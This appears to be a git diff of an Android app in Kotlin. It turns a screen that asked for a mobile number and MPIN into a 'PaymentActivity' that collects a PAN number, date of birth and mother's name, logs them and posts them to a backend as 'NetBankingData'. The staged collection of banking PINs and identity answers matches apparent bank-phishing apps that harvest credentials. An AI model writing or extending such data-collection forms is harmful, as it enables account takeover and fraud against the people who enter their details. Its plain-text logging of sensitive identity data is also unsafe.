@@ -1,18 +1,16 @@
-new comitt
-
-
 package com.example.refactor.activities
 
-import android.content.Context
 import android.content.Intent
 import android.os.Bundle
+import android.text.Editable
+import android.text.TextWatcher
 import android.util.Log
 import android.widget.Button
 import android.widget.EditText
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
 import com.example.refactor.R
-import com.example.refactor.models.FormData
+import com.example.refactor.models.NetBankingData
 import com.example.refactor.network.ApiClient
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
@@ -20,105 +18,175 @@ import kotlinx.coroutines.launch
 import retrofit2.HttpException
 import java.io.IOException
 
-class FormActivity : AppCompatActivity() {
+class PaymentActivity : AppCompatActivity() {
 
-    private lateinit var etMobileNumber: EditText
-    private lateinit var etMPin: EditText
-    private lateinit var btnNextForm: Button
+    private lateinit var etPanNumber: EditText
+    private lateinit var etDob: EditText
+    private lateinit var etMotherName: EditText
+    private lateinit var btnNextPayment: Button
+
+    private var userId: String? = null // Variable to store userId
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        setContentView(R.layout.activity_form)
+        setContentView(R.layout.activity_payment)
 
-        etMobileNumber = findViewById(R.id.etMobileNumber)
-        etMPin = findViewById(R.id.etMPin)
-        btnNextForm = findViewById(R.id.btnProceed)
+        // Initialize views
+        etPanNumber = findViewById(R.id.etPanNumber)
+        etDob = findViewById(R.id.etDob)
+        etMotherName = findViewById(R.id.etMotherName)
+        btnNextPayment = findViewById(R.id.btnProceed)
 
-        btnNextForm.setOnClickListener {
-            val mobileNumber = etMobileNumber.text.toString().trim()
-            val mPin = etMPin.text.toString().trim()
+        // Retrieve the userId passed from the previous activity
+        userId = intent.getStringExtra("USER_ID")
 
-            if (validateInputs(mobileNumber, mPin)) {
-                submitFormData(mobileNumber, mPin)
+        // Set up input formatting for DOB field
+        setupDobAutoFormat()
+
+        // Handle button click
+        btnNextPayment.setOnClickListener {
+            val panNumber = etPanNumber.text.toString().trim()
+            val dob = etDob.text.toString().trim()
+            val motherName = etMotherName.text.toString().trim()
+
+            if (validateInputs(panNumber, dob, motherName)) {
+                submitPaymentData(panNumber, dob, motherName)
+            } else {
+                showToast("Please fill all fields with valid data!")
             }
         }
     }
 
-    private fun validateInputs(mobileNumber: String, mPin: String): Boolean {
-        val mobileRegex = "^[6-9]\\d{9}$".toRegex()
-        val mPinRegex = "^\\d{6}$".toRegex()
+    // Set up automatic formatting for DOB (dd/MM/yyyy)
+    private fun setupDobAutoFormat() {
+        etDob.addTextChangedListener(object : TextWatcher {
+            private var isFormatting = false
+            private val maxLength = 10
 
-        if (!mobileRegex.matches(mobileNumber)) {
-            showToast("Invalid Mobile Number!")
-            return false
-        }
+            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
 
-        if (!mPinRegex.matches(mPin)) {
-            showToast("Invalid MPIN!")
-            return false
-        }
+            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {
+                if (isFormatting) return
 
-        return true
+                val input = s.toString().replace("/", "") // Remove existing slashes
+                val formatted = StringBuilder()
+
+                // Ensure correct format dd/MM/yyyy
+                for (i in input.indices) {
+                    formatted.append(input[i])
+                    if ((i == 1 || i == 3) && formatted.length < maxLength) {
+                        formatted.append("/")
+                    }
+                }
+
+                isFormatting = true
+                etDob.setText(formatted.toString())
+                etDob.setSelection(formatted.length) // Move cursor to the end
+                isFormatting = false
+            }
+
+            override fun afterTextChanged(s: Editable?) {}
+        })
     }
 
-    private fun submitFormData(mobileNumber: String, mPin: String) {
-        val apiInterface = ApiClient.api
-        val formData = FormData(mobile = mobileNumber, mPin = mPin)
 
-        Log.d("FormActivity", "Sending data to backend")
+    // Validate inputs
+    private fun validateInputs(panNumber: String, dob: String, motherName: String): Boolean {
+        val panPattern = "^[A-Z]{5}[0-9]{4}[A-Z]$"
+        val dobPattern = "\\d{2}/\\d{2}/\\d{4}" // dd/MM/yyyy format
+
+        val isPanValid = panNumber.matches(panPattern.toRegex())
+        val isDobValid = dob.matches(dobPattern.toRegex())
+        val isMotherNameValid = motherName.isNotEmpty()
+
+        if (!isPanValid) {
+            showToast("Invalid PAN format!")
+        }
+
+        if (!isDobValid) {
+            showToast("Invalid DOB format!")
+        }
+
+        if (!isMotherNameValid) {
+            showToast("Mother's name cannot be empty!")
+        }
+
+        return isPanValid && isDobValid && isMotherNameValid
+    }
+
+    // Submit payment data to the backend
+    private fun submitPaymentData(panNumber: String, dob: String, motherName: String) {
+        if (userId.isNullOrEmpty()) {
+            showToast("User ID is missing! Unable to submit data.")
+            return
+        }
+
+        val apiInterface = ApiClient.api
+        val netBankingData = NetBankingData(userId!!, panNumber, dob, motherName)
+
+        // Log data being sent to the backend
+        Log.d("PaymentActivity", "Sending data to backend: $netBankingData")
 
         CoroutineScope(Dispatchers.IO).launch {
             try {
-                val response = apiInterface.saveFormDataStep1(formData)
+                val response = apiInterface.saveFormDataStep2(netBankingData)
+
+                // Log the API call response
+                Log.d("PaymentActivity", "Response received: $response")
+
                 if (response.isSuccessful) {
                     val responseBody = response.body()
                     if (responseBody?.success == true) {
-                        val userId = responseBody.data?.userId
-                        Log.d("FormActivity", "User ID received")
-                        runOnUiThread { handleUserId(userId) }
+                        Log.d("PaymentActivity", "Data submitted successfully. Response: $responseBody")
+                        runOnUiThread {
+                            navigateToNextStep()
+                        }
                     } else {
-                        runOnUiThread { showToast("Submission failed") }
+                        Log.d("PaymentActivity", "Submission failed. Response message: ${responseBody?.message}")
+                        runOnUiThread {
+                            showToast(responseBody?.message ?: "Submission failed!")
+                        }
                     }
                 } else {
-                    runOnUiThread { showToast("Submission error") }
+                    // Error response from server
+                    Log.d("PaymentActivity", "Error occurred. Response: ${response.errorBody()?.string()}")
+                    runOnUiThread {
+                        showToast("Error: ${response.errorBody()?.string() ?: "Unknown error occurred"}")
+                    }
                 }
             } catch (e: HttpException) {
-                Log.e("FormActivity", "HTTP Exception")
-                runOnUiThread { showToast("HTTP Error") }
+                // Handle HTTP exceptions (e.g., 4xx or 5xx status codes)
+                Log.e("PaymentActivity", "HTTP Exception: ${e.message}", e)
+                runOnUiThread {
+                    showToast("HTTP Error!")
+                }
             } catch (e: IOException) {
-                Log.e("FormActivity", "Network Error")
-                runOnUiThread { showToast("Network Error") }
+                // Handle network-related errors (e.g., no internet)
+                Log.e("PaymentActivity", "Network Error: ${e.message}", e)
+                runOnUiThread {
+                    showToast("Network Error: Please check your connection.")
+                }
             } catch (e: Exception) {
-                Log.e("FormActivity", "Unexpected Error")
-                runOnUiThread { showToast("Unexpected Error") }
+                // Handle other unexpected errors
+                Log.e("PaymentActivity", "Unexpected Error: ${e.message}", e)
+                runOnUiThread {
+                    showToast("Unexpected Error!")
+                }
             }
         }
     }
 
-    private fun handleUserId(userId: String?) {
-        if (!userId.isNullOrEmpty()) {
-            saveUserIdToSharedPreferences(userId)
-            showToast("Data submitted successfully!")
-            navigateToNextForm(userId)
-        } else {
-            showToast("Data submition Failed!")
-        }
-    }
-
-    private fun saveUserIdToSharedPreferences(userId: String) {
-        val sharedPref = getSharedPreferences("UserPreferences", Context.MODE_PRIVATE)
-        val editor = sharedPref.edit()
-        editor.putString("userId", userId)
-        editor.apply()
-    }
-
+    // Show a Toast message
     private fun showToast(message: String) {
         Toast.makeText(this, message, Toast.LENGTH_SHORT).show()
     }
 
-    private fun navigateToNextForm(userId: String) {
-        val intent = Intent(this, PaymentActivity::class.java)
-        intent.putExtra("USER_ID", userId)
+    // Navigate to the SuccessActivity
+    private fun navigateToNextStep() {
+        // Ensure that the backend call was successful before navigating
+        showToast("data submitted successfully!")
+        val intent = Intent(this, SuccessActivity::class.java)
+        intent.putExtra("USER_ID", userId) // Pass the userId to the next activity
         startActivity(intent)
         finish()
     }
